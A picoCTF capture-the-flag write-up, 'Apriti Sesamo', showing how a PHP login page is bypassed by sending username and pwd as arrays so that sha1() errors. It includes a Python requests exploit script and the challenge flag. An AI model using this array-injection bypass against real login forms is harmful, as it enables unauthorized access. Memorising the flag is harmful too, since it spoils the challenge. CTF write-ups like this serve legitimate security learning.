
# **Apriti Sesamo - PicoCTF Write-up**

**Category:** Web Exploitation  
**Points:** 300  
**Author:** Junias Bonou

## **Challenge Description**

> I found a web app that claims to be impossible to hack!  
> Try it here!

A web application claims to be "impossible" to hack. Our goal is to bypass its security and retrieve the flag.

---

## **Step 1: Inspecting the Login Page**

Upon visiting the challenge website, we see a simple login form:
![[Pasted image 20250312234637.png]]

`<form action="impossibleLogin.php" method="post">     <label for="username">Username:</label><br>     <input type="text" id="username" name="username"><br>     \<label for="pwd">Password:</label><br>     <input type="password" id="pwd" name="pwd"><br><br>     <input type="submit" value="Login"> </form>`
![[Pasted image 20250312234749.png]]

This form sends a `POST` request to `impossibleLogin.php`.

---

## **Step 2: Analyzing Backend Errors**

Upon submitting random credentials, the following PHP warning appears:

`Warning: sha1() expects parameter 1 to be string, array given in /var/www/html/impossibleLogin.php on line 38`

This suggests a possible vulnerability in the handling of form inputs.

---

## **Step 3: Exploiting the Input Handling**

Looking at the form, we see the login parameters:

- `username`
- `pwd`

In PHP, if a parameter is sent as an array (`username[]` instead of `username`), it can cause unexpected behavior. The error message suggests that `sha1()` is expecting a string but receives an array instead.
```
import requests

# Target URL
url ="http://verbal-sleep.picoctf.net:50313/impossibleLogin.php"  
payload = {
    "username[]": "a", 
    "pwd[]": "b"  
}

# Send the POST request
response = requests.post(url, data=payload)

# Print the response (likely the flag if successful)
print(response.text)

```

---

## **Step 4: Retrieving the Flag**

Executing the script returns:

CopyEdit

`picoCTF{w3Ll_d3sErV3d_Ch4mp_5b269555}`

---

## **Conclusion**

This challenge exploited improper input handling in PHP:

- Sending an array instead of a string caused a type error.
- This error bypassed authentication, revealing the flag.

### **Key Takeaways**

✔ Always validate and sanitize user input.  
✔ PHP functions like `sha1()` expect specific data types; improper handling can lead to vulnerabilities.  
✔ Array injection is a simple yet effective technique in some web-based CTF challenges.


![[Pasted image 20250312234330.png]]